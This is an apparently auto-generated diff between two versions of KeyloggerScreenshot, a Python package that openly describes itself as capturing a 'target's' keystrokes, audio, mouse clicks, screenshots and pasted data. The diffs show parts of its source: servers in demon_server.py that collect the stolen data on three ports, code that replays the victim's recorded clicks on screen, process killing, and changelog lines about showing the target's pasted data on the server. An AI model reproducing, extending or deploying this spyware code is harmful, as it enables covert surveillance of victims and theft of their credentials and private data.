+         all_exe = [(exe.replace(r"K\\r\\n", "").replace(r"K\r\n", ""), str_data[idx + 1]) for idx, exe in enumerate(str_data) if ".exe" in exe]
+-        photo = []
+-        for task, pid in all_exe:
+-            if task == "PhotosApp.exe":
+-                photo.append((task, pid))
++        photo = [(task, pid) for task, pid in all_exe if task == "PhotosApp.exe"]
+ 
+         if photo:
+             os.system(f"taskkill /f /PID {photo[0][1]}")
+         os._exit(0)
+ 
+     @staticmethod
+     def connection():
+@@ -96,31 +93,53 @@
+         img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
+         #This checks for all Images in the directory
+ 
+         if not img_files:
+             print('There is no "New_Image" in this directory')
+             sys.exit()
+ 
++
+         pg.FAILSAFE = False
+         #This is for the corner allowance
+         img_seconds = 5.572
+         #This is the speed it takes to open the image
+         speed = 0.47
+         #This is the time each coordinate needs
+         sleep = 1.5
+-        #This is the time where the code is taking a time out
++        # This is the time, where the code is taking a time out
+         one_coordinate = speed + sleep
+ 
+-        duration_seconds = one_coordinate * len(every_coordinate)
+-        one_image = duration_seconds + img_seconds
+-        summed_up = one_image * len(img_files)
+-        seconds = round(summed_up)
++        if sys.platform != "linux": # This calculation is for windows
++            # This is for the corner allowance
++            img_seconds = 5.572
++            # This is the speed it takes to open the image
++            speed = 0.47
++            # This is the time each coordinate needs
++            escape = 0.1
++            # This is the time the program needs to escape an image
++            one_coordinate = speed + sleep
++            duration_seconds = one_coordinate * len(every_coordinate)
++            one_image = duration_seconds + img_seconds + escape
++            seconds = round(one_image * len(img_files))
++            # This calculates the amount it will take
++
++        else:
++            # Same code as above but this is for linux
++            open_img = 2.7
++            one_cor = 1.9
++            all_cor = one_cor * len(every_coordinate)
++            esc = 0.1
++            this_img = all_cor + open_img + esc
++            seconds = round(this_img * len(img_files))
++
+         #This calculates the amount it will take
+ 
+         print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
++        threading_count = threading.Thread(target=Simulation.countdown, args=(seconds, ))
++        # The countdown will start
+         threading_count = threading.Thread(target=Simulation.countdown)
+         #The countdown will start
+         threading_count.start()
+ 
+         pg.sleep(4)
+         for image in img_files:
+             im = PIL.Image.open(image)
+```
+
+### Comparing `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/PKG-INFO` & `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/PKG-INFO`
+
+ * *Files 2% similar despite different names*
+
+```diff
+@@ -1,10 +1,10 @@
+ Metadata-Version: 2.1
+ Name: KeyloggerScreenshot
+-Version: 0.3.0
++Version: 0.3.1
+ Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
+ Home-page: 
+ Author: Fawaz Bashiru
+ Author-email: fawazbashiru@gmail.com
+ License: MIT
+ Keywords: KeyloggerScreenshot
+ Classifier: Development Status :: 6 - Mature
+@@ -329,11 +329,17 @@
+ 
+ 0.2.9.1 (15/04/2023)
+ --------------------
+ - Data which the target has pasted will now be shown on the server
+ - Documentation incoming
+ 
+ 0.3.0 (20/04/2023)
++---------------------
+ - Simulation now stops after stop button is pressed
+ - Bug fixes
+ - New Code on "Simulation_code.py" and on "KLS_Start.py"
+ - New files on github https://github.com/Kill0geR/KeyloggerScreenshot
++
++0.3.1 (26/04/2023)
++---------------------
++- Bug fixes
++- Cleaner Code
+```
+
+### Comparing `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/SOURCES.txt` & `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/SOURCES.txt`
+
+ * *Files 12% similar despite different names*
+
+```diff
+@@ -1,20 +1,20 @@
+ CHANGELOG.txt
+ KLS_start.py
+ LISCENCE.txt
+ MANIFEST.in
+ README.md
++Simulation_code.py
+ client.py
+ demon_server.py
+ img_1.png
+ leo_gui.py
+ requirements.py
+ setup.py
+ target.py
+-test.py
+ KeyloggerScreenshot/Keylogger_Target.py
+ KeyloggerScreenshot/Port_data.py
+ KeyloggerScreenshot/Server_keylogger.py
+ KeyloggerScreenshot/Server_listener.py
+ KeyloggerScreenshot/Server_photos.py
+ KeyloggerScreenshot/Server_timer.py
+ KeyloggerScreenshot/Simulation_code.py
+```
+
+### Comparing `KeyloggerScreenshot-0.3.0/LISCENCE.txt` & `KeyloggerScreenshot-0.3.1/LISCENCE.txt`
+
+ * *Files identical despite different names*
+
+### Comparing `KeyloggerScreenshot-0.3.0/PKG-INFO` & `KeyloggerScreenshot-0.3.1/PKG-INFO`
+
+ * *Files 2% similar despite different names*
+
+```diff
+@@ -1,10 +1,10 @@
+ Metadata-Version: 2.1
+ Name: KeyloggerScreenshot
+-Version: 0.3.0
++Version: 0.3.1
+ Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
+ Home-page: 
+ Author: Fawaz Bashiru
+ Author-email: fawazbashiru@gmail.com
+ License: MIT
+ Keywords: KeyloggerScreenshot
+ Classifier: Development Status :: 6 - Mature
+@@ -329,11 +329,17 @@
+ 
+ 0.2.9.1 (15/04/2023)
+ --------------------
+ - Data which the target has pasted will now be shown on the server
+ - Documentation incoming
+ 
+ 0.3.0 (20/04/2023)
++---------------------
+ - Simulation now stops after stop button is pressed
+ - Bug fixes
+ - New Code on "Simulation_code.py" and on "KLS_Start.py"
+ - New files on github https://github.com/Kill0geR/KeyloggerScreenshot
++
++0.3.1 (26/04/2023)
++---------------------
++- Bug fixes
++- Cleaner Code
+```
+
+### Comparing `KeyloggerScreenshot-0.3.0/README.md` & `KeyloggerScreenshot-0.3.1/README.md`
+
+ * *Files identical despite different names*
+
+### Comparing `KeyloggerScreenshot-0.3.0/demon_server.py` & `KeyloggerScreenshot-0.3.1/demon_server.py`
+
+ * *Files 1% similar despite different names*
+
+```diff
+@@ -1,11 +1,11 @@
+ import KeyloggerScreenshot as ks
+ import threading
+ 
+-ip = "192.168.145.67"
++ip = "192.168.0.70"
+ 
+ server_photos = ks.ServerPhotos(ip, 1111)
+ 
+ server_keylogger = ks.ServerKeylogger(ip, 2222, simulater=True)
+ 
+ server_listener = ks.ServerListener(ip, 3333)
+```
+
+### Comparing `KeyloggerScreenshot-0.3.0/img_1.png` & `KeyloggerScreenshot-0.3.1/img_1.png`
+
+ * *Files identical despite different names*
+
+### Comparing `KeyloggerScreenshot-0.3.0/leo_gui.py` & `KeyloggerScreenshot-0.3.1/leo_gui.py`
+
+ * *Files identical despite different names*
+
+### Comparing `KeyloggerScreenshot-0.3.0/requirements.py` & `KeyloggerScreenshot-0.3.1/requirements.py`
+
+ * *Files identical despite different names*
+
+### Comparing `KeyloggerScreenshot-0.3.0/setup.py` & `KeyloggerScreenshot-0.3.1/setup.py`
+
+ * *Files 1% similar despite different names*
+
+```diff
+@@ -6,15 +6,15 @@
+     'Operating System :: Microsoft :: Windows :: Windows 10',
+     'License :: OSI Approved :: MIT License',
+     'Programming Language :: Python :: 3'
+ ]
+ 
+ setup(
+     name='KeyloggerScreenshot',
+-    version='0.3.0',
++    version='0.3.1',
+     description='Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot',
+     long_description_content_type="text/markdown",
+     long_description=open('README.md').read() + '\n\n' + open('CHANGELOG.txt').read(),
+     url='',
+     author='Fawaz Bashiru',
+     author_email='fawazbashiru@gmail.com',
+     license='MIT',
+```
+
